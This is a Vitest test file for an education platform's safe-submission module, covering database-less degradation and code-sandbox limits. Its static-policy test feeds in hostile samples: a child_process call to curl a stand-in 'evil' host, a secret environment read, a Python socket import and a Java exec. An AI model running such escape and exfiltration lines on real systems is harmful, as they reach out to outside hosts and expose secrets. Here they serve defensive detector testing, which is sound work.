/**
 * Edikit — Safe File/Code/Oral Submission integration tests (Prompt 44)
 *
 * Service-contract coverage (graceful degradation without PG) + code
 * sandbox escape / resource-limit contract:
 *   - createUploadSession requires PostgreSQL (validate-first)
 *   - appendUploadChunk requires PostgreSQL
 *   - finalizeUpload requires PostgreSQL
 *   - submitVersion requires PostgreSQL
 *   - list paths degrade to empty arrays / null
 *   - createMediaTranscript rejects invalid kind BEFORE DB
 *   - static policy + sandbox limits contract (code escape guard)
 */

import { describe, it, expect } from 'vitest';
import {
  createUploadSession,
  appendUploadChunk,
  finalizeUpload,
  submitVersion,
  listSubmissionVersions,
  listUploadSessions,
  getUploadSession,
  listManualListenQueue,
  createMediaTranscript,
  codeSandboxLimits,
  staticCodePolicyCheck,
} from '../../src/modules/safe-submit/index.js';

describe('SafeSubmit — service contract (graceful degradation without PG)', () => {
  it('createUploadSession requires PostgreSQL', async () => {
    await expect(
      createUploadSession({ attemptId: 1, userId: 1, sessionKey: 'sk-1', kind: 'file', declaredMime: 'application/pdf', expectedSize: 100 })
    ).rejects.toThrow('PostgreSQL required');
  });

  it('appendUploadChunk requires PostgreSQL', async () => {
    await expect(
      appendUploadChunk({ sessionId: 1, userId: 1, chunkIndex: 0, offset: 0, chunkData: Buffer.from('x') })
    ).rejects.toThrow('PostgreSQL required');
  });

  it('finalizeUpload requires PostgreSQL', async () => {
    await expect(finalizeUpload({ sessionId: 1, userId: 1 })).rejects.toThrow('PostgreSQL required');
  });

  it('submitVersion requires PostgreSQL', async () => {
    await expect(submitVersion({ attemptId: 1, userId: 1, uploadSessionId: 1 })).rejects.toThrow('PostgreSQL required');
  });

  it('listSubmissionVersions degrades to empty array', async () => {
    expect(await listSubmissionVersions({ attemptId: 1 })).toEqual([]);
  });

  it('listUploadSessions degrades to empty array', async () => {
    expect(await listUploadSessions({ attemptId: 1 })).toEqual([]);
  });

  it('getUploadSession degrades to null', async () => {
    expect(await getUploadSession(1)).toBeNull();
  });

  it('listManualListenQueue degrades to empty array', async () => {
    expect(await listManualListenQueue()).toEqual([]);
  });

  it('createMediaTranscript rejects invalid kind before DB', async () => {
    await expect(
      createMediaTranscript({ sessionId: 1, attemptId: 1, userId: 1, kind: 'bogus', transcriptText: 'x', confidence: 0.9 })
    ).rejects.toThrow(/Invalid transcript kind/);
  });
});

describe('SafeSubmit — code sandbox escape / resource-limit contract (Prompt 44 §12)', () => {
  it('sandbox contract blocks network egress and caps resources', () => {
    const c = codeSandboxLimits();
    expect(c.network).toBe('none');
    expect(c.cpuCores).toBe(1);
    expect(c.memoryMB).toBeLessThanOrEqual(512);
    expect(c.timeoutSeconds).toBeLessThanOrEqual(10);
    expect(c.writablePaths).toEqual(['/tmp']);
    expect(c.processCount).toBeLessThanOrEqual(32);
  });

  it('static policy flags code escape attempts (never runs hooks)', () => {
    // Network exfiltration via child_process
    expect(staticCodePolicyCheck({ source: 'child_process.exec("curl http://evil")' }).flags).toContain('child_process');
    // Node fs env read
    expect(staticCodePolicyCheck({ source: 'process.env.SECRET' }).flags).toContain('env_read');
    // Python socket
    expect(staticCodePolicyCheck({ source: 'import socket' }).flags).toContain('python_socket');
    // Java exec
    expect(staticCodePolicyCheck({ source: 'Runtime.getRuntime().exec("id")' }).flags).toContain('java_exec');
    // Benign code passes
    expect(staticCodePolicyCheck({ source: 'function f(){ return 1; }' }).verdict).toBe('clean');
  });
});
